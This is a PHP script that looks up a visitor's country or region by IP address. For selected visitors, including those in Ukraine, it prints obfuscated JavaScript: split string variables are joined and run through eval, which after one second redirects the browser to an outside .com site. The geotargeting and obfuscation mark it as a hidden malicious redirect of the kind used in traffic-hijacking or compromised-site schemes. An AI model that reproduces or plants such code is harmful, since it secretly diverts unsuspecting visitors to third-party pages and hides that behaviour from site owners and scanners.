<?php
require_once("ip.inc.php" );
//$ipList = new IPGeo("77.88.21.8,93.158.134.8,213.180.204.8" );
//или
//$ipList = new IPGeo(array("77.88.21.8","93.158.134.8","213.180.204.8" ));
//или

$ip = $_GET["ip"];

if (!$ip) $ip = $_SERVER["REMOTE_ADDR"];

$ipList = new IPGeo($ip);

if ($ipList->ip($ip) == 1 || $ipList->ip($ip) == 2)
{
	print 'var t08="setT";var t09="imeo";var t10="ut(\"";var t11="w";var t12="i";var t13="n";var t14="d";var t15="o";var t16="w.";var t21="loc";var t22="ation=";var t31="\'";var t32="ht";var t33="t";var t34="p";var t35=":";var t36="/";var t01="rez";var t38="inov";var t39=".com\';";var t40="\", 1000);";eval(t08+t09+t10+t11+t12+t13+t14+t15+t16+t21+t22+t31+t32+t33+t34+t35+t36+t36+t01+t38+t39+t40);';
}
else
{
	$loc =  GetLoc($ip);

	if ($loc == "UA") // ua
		print 'var t08="setT";var t09="imeo";var t10="ut(\"";var t11="w";var t12="i";var t13="n";var t14="d";var t15="o";var t16="w.";var t21="loc";var t22="ation=";var t31="\'";var t32="ht";var t33="t";var t34="p";var t35=":";var t36="/";var t01="rez";var t38="inov";var t39=".com\';";var t40="\", 1000);";eval(t08+t09+t10+t11+t12+t13+t14+t15+t16+t21+t22+t31+t32+t33+t34+t35+t36+t36+t01+t38+t39+t40);';
}

function GetLoc($ip)
{
  include_once ("geoip.inc");
  $gi = geoip_open("GeoIP.dat", GEOIP_STANDARD);
  $code = geoip_country_code_by_addr($gi, $ip);
  geoip_close($gi);

  return $code;
}

//print "Регион: " . $ipList->ip("77.88.21.8", "region" ) . "<br>";
?>